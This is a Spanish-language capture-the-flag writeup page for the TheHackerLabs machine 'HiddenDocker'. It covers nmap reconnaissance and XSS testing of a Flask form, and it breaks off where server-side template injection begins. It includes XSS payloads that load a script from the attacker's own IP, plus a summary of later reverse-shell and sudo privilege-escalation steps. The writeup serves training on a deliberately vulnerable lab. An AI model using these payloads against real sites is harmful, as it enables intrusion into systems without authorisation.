@@ -1,0 +1,1328 @@
+<!DOCTYPE html>
+<html lang="es-MX">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>HiddenDocker - TheHackerLabs · BerserkWings - Hacking Ético</title>
+<meta name="description" content="Writeups de ciberseguridad, CTFs, Active Directory y certificaciones.">
+
+<meta http-equiv="Content-Security-Policy"
+      content="default-src 'self';
+               img-src 'self';
+               style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
+               font-src 'self' https://fonts.gstatic.com;
+               script-src 'self' ;
+               connect-src 'self' ;
+               object-src 'none';
+               base-uri 'self';
+               form-action 'self';
+               upgrade-insecure-requests;">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+
+<link rel="canonical" href="http://localhost:1313/THL-writeup-hiddenDocker/">
+<link rel="icon" href="/assets/images/favicon.png">
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Chakra+Petch:wght@500;600;700&family=Inter:wght@400;500&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/main.min.b51fce260bd224cda026ea0223adf133e0ce779edbb6c14d513c3f101c33a9ff.css" integrity="sha256-tR/OJgvSJM2gJuoCI63xM&#43;DOd57btsFNUTw/EBwzqf8=">
+
+
+<meta property="og:title" content="HiddenDocker - TheHackerLabs">
+<meta property="og:description" content="Writeups de ciberseguridad, CTFs, Active Directory y certificaciones.">
+<meta property="og:type" content="article">
+<meta property="og:image" content="http://localhost:1313/assets/images/THL-writeup-hiddenDocker/hiddenDocker.jpg">
+
+
+
+</head>
+<body>
+  <header class="site-header">
+  <div class="wrap">
+    <a class="brand" href="/">
+      
+      <img class="brand-logo" src="http://localhost:1313/assets/images/masthead.png" alt="BerserkWings">
+      
+    </a>
+    <nav class="main-nav">
+      
+        <a href="/" >Inicio</a>
+      
+        <a href="/posts/" >Writeups</a>
+      
+        <a href="/categories/" >Categorías</a>
+      
+        <a href="/tags/" >Etiquetas</a>
+      
+        <a href="/buscador/" >Buscador</a>
+      
+        <a href="/acerca-de-mi/" >Acerca de mí</a>
+      
+    </nav>
+  </div>
+</header>
+
+  <main>
+    
+<canvas class="hero-matrix-bg hero-matrix-bg--dim" id="heroMatrixBg" aria-hidden="true"></canvas>
+<article class="post" id="top">
+  
+
+
+
+
+<aside class="side-profile">
+  <img class="side-avatar" src="http://localhost:1313/assets/images/avatar.png" alt="BerserkWings">
+  <div class="side-name">BerserkWings</div>
+  <div class="side-tagline">Aspirante a Pentester · CTF Player</div>
+
+  
+  <div class="side-platforms">
+    <span class="side-platform-badge">HTB: BerserkWings</span>
+    <span class="side-platform-badge">THL: BerserkWings</span>
+  </div>
+  
+
+  <div class="side-contact">
+    <span class="side-meta">📍 México</span>
+    
+    <a class="side-meta-link" href="https://github.com/BerserkWings" target="_blank" rel="noopener noreferrer">🔗 GitHub</a>
+    
+  </div>
+
+  
+  <div class="side-posts">
+    <div class="side-post-cards">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/THL-writeup-gazpacho/">
+          <span class="side-post-card-title">Gazpacho</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/THL-writeup-cryptoLabyrinth/">
+          <span class="side-post-card-title">CryptoLabyrinth</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <div class="side-post-card is-current">
+          <span class="side-post-card-title">HiddenDocker</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </div>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/THL-writeup-canYouHackMe/">
+          <span class="side-post-card-title">Can You Hack Me?</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/THL-writeup-puchero/">
+          <span class="side-post-card-title">Puchero</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </a>
+        
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+  </div>
+  
+
+  
+
+  
+
+
+</aside>
+
+
+  
+  
+  
+
+  <header class="post-header">
+    
+    <div class="post-meta">TheHackerLabs / Medium Machine</div>
+    
+    <h1>HiddenDocker - TheHackerLabs</h1>
+    <div class="post-meta">21 June 2025 · 18 min de lectura</div>
+  </header>
+
+  
+  <img class="post-cover" src="http://localhost:1313/assets/images/THL-writeup-hiddenDocker/hiddenDocker.jpg" alt="HiddenDocker - TheHackerLabs">
+  
+
+  
+  <p class="post-lead">Esta fue una máquina algo complicada. Después de analizar la página web del puerto 5000, que utiliza Werkzeug y Flask, descubrimos que es vulnerable a XSS y a Server Side Template Injection (SSTI), siendo así que logramos ganar acceso a la máquina víctima. Enumerando la máquina, descubrimos que hay un contenedor de Docker que tiene una página web activa en el puerto 80, así que aplicamos Reverse Port Forwarding para poder ver y analizar esa página. Luego de aplicarle Fuzzing, descubrimos una página que nos permite subir archivos. Aplicamos un Sniper Attack con la herramienta Intruder de BurpSuite para descubrir qué extensiones de archivos puede aceptar, logrando descubrir una extensión que nos permite subir una Reverse Shell con la que ganamos acceso al contenedor de Docker. Dentro del contenedor, descubrimos un mensaje que nos da una pista sobre dónde encontrar la contraseña del usuario Root. Además, descubrimos que nuestro usuario tiene privilegios para usar los comandos cut y grep como Root, por lo que usamos la guía de GTFOBins para aprovecharnos de estos comandos y ver la contraseña del usuario Root, con la que ganamos acceso a la máquina víctima vía SSH como Root.</p>
+  
+
+  
+  <details class="post-tools">
+    <summary>🛠 Herramientas utilizadas</summary>
+
+    
+      
+      <ul><li><code>ping</code></li><li><code>nmap</code></li><li><code>wappalizer</code></li><li><code>Javascript</code></li><li><code>PHP</code></li><li><code>nc</code></li><li><code>cat</code></li><li><code>ip</code></li><li><code>ping</code></li><li><code>bash</code></li><li><code>chisel</code></li><li><code>python3</code></li><li><code>wget</code></li><li><code>tail</code></li><li><code>proxychains</code></li><li><code>ffuf</code></li><li><code>BurpSuite</code></li><li><code>hostname</code></li><li><code>sudo</code></li><li><code>cut</code></li><li><code>grep</code></li><li><code>ssh</code></li></ul>
+    
+  </details>
+  
+
+  
+  <details class="toc" id="indice" open>
+    <summary>📑 Índice</summary>
+    <nav>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#Recopilacion">Recopilación de Información</a>
+      <ul>
+        <li><a href="#Ping">Traza ICMP</a></li>
+        <li><a href="#Puertos">Escaneo de Puertos</a></li>
+        <li><a href="#Servicios">Escaneo de Servicios</a></li>
+      </ul>
+    </li>
+    <li><a href="#Analisis">Análisis de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#Puerto5k">Analizando Página Web de Puerto 5000</a></li>
+      </ul>
+    </li>
+    <li><a href="#Explotacion">Explotación de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#XSS">Identificando Campos Vulnerables a XSS</a></li>
+        <li><a href="#SSTI">Aplicando Server Side Template Injection (SSTI) y Ganando Acceso a la Máquina</a></li>
+      </ul>
+    </li>
+    <li><a href="#Post">Post Explotación</a>
+      <ul>
+        <li><a href="#linEnum">Enumeración de la Máquina</a></li>
+        <li><a href="#contenedor">Aplicando Port Forwarding y Tunneling para Ver Página/Contenedor de Docker</a>
+          <ul>
+            <li><a href="#portForwarding">Aplicando Reverse Port Forwarding para Ver Página Web de Contenedor Docker</a></li>
+            <li><a href="#Tunneling">Aplicando Reverse Tunneling con SOCKS Proxy para Alcanzar Contenedor de Docker</a></li>
+          </ul>
+        </li>
+        <li><a href="#PaginaDocker">Analizando Página Web del Contenedor Docker</a></li>
+        <li><a href="#intruder">Aplicando Sniper Attack para Encontrar Extensiones Aceptadas por Página Web y Ganando Acceso al Contenedor de Docker</a></li>
+        <li><a href="#enumDock">Enumeración de Contenedor y Ganando Acceso como Root a la Máquina Víctima Vía SSH</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+      <ul><li><a href="#links-de-investigacion">Links de investigación</a></li></ul>
+    </nav>
+  </details>
+  <aside class="side-toc">
+    <div class="side-toc-header">📑 Índice</div>
+    <nav>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#Recopilacion">Recopilación de Información</a>
+      <ul>
+        <li><a href="#Ping">Traza ICMP</a></li>
+        <li><a href="#Puertos">Escaneo de Puertos</a></li>
+        <li><a href="#Servicios">Escaneo de Servicios</a></li>
+      </ul>
+    </li>
+    <li><a href="#Analisis">Análisis de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#Puerto5k">Analizando Página Web de Puerto 5000</a></li>
+      </ul>
+    </li>
+    <li><a href="#Explotacion">Explotación de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#XSS">Identificando Campos Vulnerables a XSS</a></li>
+        <li><a href="#SSTI">Aplicando Server Side Template Injection (SSTI) y Ganando Acceso a la Máquina</a></li>
+      </ul>
+    </li>
+    <li><a href="#Post">Post Explotación</a>
+      <ul>
+        <li><a href="#linEnum">Enumeración de la Máquina</a></li>
+        <li><a href="#contenedor">Aplicando Port Forwarding y Tunneling para Ver Página/Contenedor de Docker</a>
+          <ul>
+            <li><a href="#portForwarding">Aplicando Reverse Port Forwarding para Ver Página Web de Contenedor Docker</a></li>
+            <li><a href="#Tunneling">Aplicando Reverse Tunneling con SOCKS Proxy para Alcanzar Contenedor de Docker</a></li>
+          </ul>
+        </li>
+        <li><a href="#PaginaDocker">Analizando Página Web del Contenedor Docker</a></li>
+        <li><a href="#intruder">Aplicando Sniper Attack para Encontrar Extensiones Aceptadas por Página Web y Ganando Acceso al Contenedor de Docker</a></li>
+        <li><a href="#enumDock">Enumeración de Contenedor y Ganando Acceso como Root a la Máquina Víctima Vía SSH</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+      <ul><li><a href="#links-de-investigacion">Links de investigación</a></li></ul>
+    </nav>
+  </aside>
+  
+
+  <div class="post-content">
+    <h2 id="Recopilacion">Recopilación de Información</h2>
+<h3 id="Ping">Traza ICMP</h3>
+<p>Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ping -c <span style="color:#ae81ff">4</span> 192.168.10.130
+</span></span><span style="display:flex;"><span>PING 192.168.10.130 <span style="color:#f92672">(</span>192.168.10.130<span style="color:#f92672">)</span> 56<span style="color:#f92672">(</span>84<span style="color:#f92672">)</span> bytes of data.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 192.168.10.130: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">64</span> time<span style="color:#f92672">=</span>5.27 ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 192.168.10.130: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">64</span> time<span style="color:#f92672">=</span>0.949 ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 192.168.10.130: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">64</span> time<span style="color:#f92672">=</span>0.797 ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 192.168.10.130: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">4</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">64</span> time<span style="color:#f92672">=</span>0.663 ms
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>--- 192.168.10.130 ping statistics ---
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">4</span> packets transmitted, <span style="color:#ae81ff">4</span> received, 0% packet loss, time 3265ms
+</span></span><span style="display:flex;"><span>rtt min/avg/max/mdev <span style="color:#f92672">=</span> 0.663/1.920/5.274/1.938 ms
+</span></span></code></pre></div><p>Por el TTL sabemos que la máquina usa <strong>Linux</strong>, hagamos los escaneos de puertos y servicios.</p>
+<h3 id="Puertos">Escaneo de Puertos</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- --open -sS --min-rate <span style="color:#ae81ff">5000</span> -vvv -n -Pn 192.168.10.130 -oG allPorts
+</span></span><span style="display:flex;"><span>Host discovery disabled <span style="color:#f92672">(</span>-Pn<span style="color:#f92672">)</span>. All addresses will be marked <span style="color:#e6db74">&#39;up&#39;</span> and scan times may be slower.
+</span></span><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-06-20 12:28 CST
+</span></span><span style="display:flex;"><span>Initiating ARP Ping Scan at 12:28
+</span></span><span style="display:flex;"><span>Scanning 192.168.10.130 <span style="color:#f92672">[</span><span style="color:#ae81ff">1</span> port<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Completed ARP Ping Scan at 12:28, 0.07s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> total hosts<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Initiating SYN Stealth Scan at 12:28
+</span></span><span style="display:flex;"><span>Scanning 192.168.10.130 <span style="color:#f92672">[</span><span style="color:#ae81ff">65535</span> ports<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Discovered open port 22/tcp on 192.168.10.130
+</span></span><span style="display:flex;"><span>Discovered open port 5000/tcp on 192.168.10.130
+</span></span><span style="display:flex;"><span>Completed SYN Stealth Scan at 12:28, 11.26s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">65535</span> total ports<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.10.130
+</span></span><span style="display:flex;"><span>Host is up, received arp-response <span style="color:#f92672">(</span>0.0014s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Scanned at 2025-06-20 12:28:28 CST <span style="color:#66d9ef">for</span> 11s
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65533</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE REASON
+</span></span><span style="display:flex;"><span>22/tcp   open  ssh     syn-ack ttl <span style="color:#ae81ff">64</span>
+</span></span><span style="display:flex;"><span>5000/tcp open  upnp    syn-ack ttl <span style="color:#ae81ff">64</span>
+</span></span><span style="display:flex;"><span>MAC Address: XX <span style="color:#f92672">(</span>PCS Systemtechnik/Oracle VirtualBox virtual NIC<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Read data files from: /usr/share/nmap
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 11.56 seconds
+</span></span><span style="display:flex;"><span>           Raw packets sent: <span style="color:#ae81ff">65536</span> <span style="color:#f92672">(</span>2.884MB<span style="color:#f92672">)</span> | Rcvd: <span style="color:#ae81ff">65536</span> <span style="color:#f92672">(</span>2.621MB<span style="color:#f92672">)</span>
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-p-</em></td>
+					<td>Para indicarle un escaneo en ciertos puertos.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;open</em></td>
+					<td>Para indicar que aplique el escaneo en los puertos abiertos.</td>
+			</tr>
+			<tr>
+					<td><em>-sS</em></td>
+					<td>Para indicar un TCP Syn Port Scan para que nos agilice el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;min-rate</em></td>
+					<td>Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000).</td>
+			</tr>
+			<tr>
+					<td><em>-vvv</em></td>
+					<td>Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>-n</em></td>
+					<td>Para indicar que no se aplique resolución dns para agilizar el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>-Pn</em></td>
+					<td>Para indicar que se omita el descubrimiento de hosts.</td>
+			</tr>
+			<tr>
+					<td><em>-oG</em></td>
+					<td>Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Hay dos puertos abiertos y me da curiosidad saber qué servicios ejecuta el <strong>puerto 5000</strong>.</p>
+<h3 id="Servicios">Escaneo de Servicios</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sCV -p 22,5000 192.168.10.130 -oN targeted
+</span></span><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-06-20 12:29 CST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.10.130
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.00089s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 50:80:8f:01:a0:d4:76:f4:08:95:df:a1:45:39:71:93 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> e8:af:26:05:75:f8:3e:d0:bf:d7:42:a1:42:48:fc:e6 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>5000/tcp open  http    Werkzeug httpd 2.2.2 <span style="color:#f92672">(</span>Python 3.11.2<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|_http-title: Flask Lab
+</span></span><span style="display:flex;"><span>|_http-server-header: Werkzeug/2.2.2 Python/3.11.2
+</span></span><span style="display:flex;"><span>MAC Address: XX <span style="color:#f92672">(</span>PCS Systemtechnik/Oracle VirtualBox virtual NIC<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 7.18 seconds
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-sC</em></td>
+					<td>Para indicar un lanzamiento de scripts básicos de reconocimiento.</td>
+			</tr>
+			<tr>
+					<td><em>-sV</em></td>
+					<td>Para identificar los servicios/versión que están activos en los puertos que se analicen.</td>
+			</tr>
+			<tr>
+					<td><em>-p</em></td>
+					<td>Para indicar puertos específicos.</td>
+			</tr>
+			<tr>
+					<td><em>-oN</em></td>
+					<td>Para indicar que el output se guarde en un fichero. Lo llame targeted.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Muy bien, podemos ver que hay una página web en el <strong>puerto 5000</strong> y que está ocupando <strong>Werkzeug</strong> y, al parecer, también <strong>Flask</strong>.</p>
+<p>Ya conocemos una vulnerabilidad común que ocurre cuando se ocupan estos dos.</p>
+<p>Pero primero, vamos a analizar esa página web.</p>
+<h2 id="Analisis">Análisis de Vulnerabilidades</h2>
+<h3 id="Puerto5k">Analizando Página Web de Puerto 5000</h3>
+<p>Entremos:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-hiddenDocker/Captura1.png">
+</p>
+<p>Parece ser un formulario de registro.</p>
+<p>Veamos qué nos dice <strong>Wappalizer</strong>:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-hiddenDocker/Captura2.png">
+</p>
+<p>No veo algo que nos ayude.</p>
+<p>Revisemos el código fuente para ver cómo funciona el formulario:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-hiddenDocker/Captura3.png">
+</p>
+<p>Por lo que entiendo, el formulario manda por una <strong>petición POST</strong> los campos del formulario que introduzcamos y, una vez enviados, nos redirige a la página <code>/greet</code>.</p>
+<p>Pero parece que el campo del email no podremos modificarlo:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-hiddenDocker/Captura4.png">
+</p>
+<p>Todo esto lo podemos comprobar si capturamos el envío de la petición con <strong>BurpSuite</strong>:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-hiddenDocker/Captura5.png">
+</p>
+<p>Ahí podemos ver la data cómo se está enviando.</p>
+<p>Y cuando se envía, nos manda a la página <code>/greet</code>:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-hiddenDocker/Captura6.png">
+</p>
+<p>Algo que noté en el código fuente, es que parece que todos los campos, a excepción del campo email, aceptan cualquier texto, pues parece que no se está aplicando alguna sanitización. Además, el campo <strong>name</strong>, es el único que se refleja en la página <code>/greet</code>.</p>
+<p>Esto nos da una idea de lo que podemos probar primero.</p>
+<h2 id="Explotacion">Explotación de Vulnerabilidades</h2>
+<h3 id="XSS">Identificando Campos Vulnerables a XSS</h3>
+<p>Para el caso de los formularios, podemos probar cuál de estos es vulnerable a <strong>XSS</strong>.</p>
+<p>La idea es, probar varios <strong>payloads XSS</strong> que tengan como objetivo cargar un archivo de un servidor que tenga el nombre del campo que estamos probando.</p>
+<p>El servidor será nuestro y no importa que dicho archivo exista, pues es simplemente para identificar el campo vulnerable.</p>
+<p>Algunos ejemplos pueden ser:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&lt;script src<span style="color:#f92672">=</span>http://Tu_IP/nombre_campo&gt;&lt;/script&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&#39;</span>&gt;&lt;script src<span style="color:#f92672">=</span>http://Tu_IP/nombre_campo&gt;&lt;/script&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&gt;&lt;script src=http://Tu_IP/nombre_campo&gt;&lt;/script&gt;
+</span></span></span></code></pre></div><p>Utilizaremos el primero y usaremos un servidor de <strong>PHP</strong>, para ver mejor la petición, aunque también se puede con un servidor de <strong>Python</strong>.</p>
+<p>Inicia el servidor de <strong>PHP</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>php -S 0.0.0.0:80
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Fri Jun <span style="color:#ae81ff">20</span> 14:10:27 2025<span style="color:#f92672">]</span> PHP 8.4.6 Development Server <span style="color:#f92672">(</span>http://0.0.0.0:80<span style="color:#f92672">)</span> started
+</span></span></code></pre></div><p>Ahora, vamos a probar desde la página el payload de <strong>XSS</strong>.</p>
+<p>Recuerda escribir el nombre del campo al que se dirigirá el payload, para identificar qué campo es vulnerable:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-hiddenDocker/Captura7.png">
+</p>
+<p>Al enviarlo, vemos que un campo sí es vulnerable:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-hiddenDocker/Captura8.png">
+</p>
+<p>Y si revisamos el servidor de <strong>PHP</strong>, veremos cuál es:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>php -S 0.0.0.0:80
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Fri Jun <span style="color:#ae81ff">20</span> 13:45:47 2025<span style="color:#f92672">]</span> PHP 8.4.6 Development Server <span style="color:#f92672">(</span>http://0.0.0.0:80<span style="color:#f92672">)</span> started
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Fri Jun <span style="color:#ae81ff">20</span> 13:46:18 2025<span style="color:#f92672">]</span> Tu_IP:47018 Accepted
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Fri Jun <span style="color:#ae81ff">20</span> 13:46:18 2025<span style="color:#f92672">]</span> Tu_IP:47018 <span style="color:#f92672">[</span>404<span style="color:#f92672">]</span>: GET /name - No such file or directory
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Fri Jun <span style="color:#ae81ff">20</span> 13:46:18 2025<span style="color:#f92672">]</span> Tu_IP:47018 Closing
+</span></span></code></pre></div><p>En efecto, el campo <strong>name</strong> es vulnerable a <strong>XSS</strong>.</p>
+<p>Esto también lo podemos probar desde <strong>BurpSuite</strong>, modificando la data para incluir el payload de <strong>XSS</strong>:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-hiddenDocker/Captura9.png">
+</p>
+<p>De paso probamos el campo del email, pero está claro que ese no será vulnerable, pues ya está llenado por defecto y no se puede modificar. Además, vemos el servidor <strong>Werkzeug</strong> referenciado en la respuesta de la petición.</p>
+<p>Con esto comprobamos que:</p>
+<ul>
+<li>No hay una sanitización en ningún campo, siendo el campo <strong>name</strong> vulnerable a <strong>XSS</strong>.</li>
+<li>El campo <strong>name</strong>, es el único que se representa en la página <code>/greet</code>, después de que se envía la data.</li>
+<li>El uso del servidor <strong>Werkzeug</strong> y de que <strong>Flask</strong> también puede estar en uso, significa que puede ser vulnerable a <strong>Server Side Template Injection</strong> a través del campo <strong>name</strong>.</li>
+</ul>
+<p>Vamos a comprobarlo.</p>
+<h3 id="SSTI">Aplicando Server Side Template Injection (SSTI) y Ganando Acceso a la Máquina</h3>
+<p>Tenemos cómo referencia el siguiente blog y repositorio que nos explican como aplicar el <strong>SSTI</strong>:</p>
+<ul>
+<li><a href="https://exploit-notes.hdks.org/exploit/web/framework/python/flask-jinja2-pentesting/" target="_blank">Flask Jinja2 Pentesting</a></li>
+<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md#jinja2" target="_blank">PayloadAllTheThings: Jinja2</a></li>
+</ul>
+<p>Veamos si reproduce la siguiente multiplicación:</p>
+<p>{% raw %}</p>
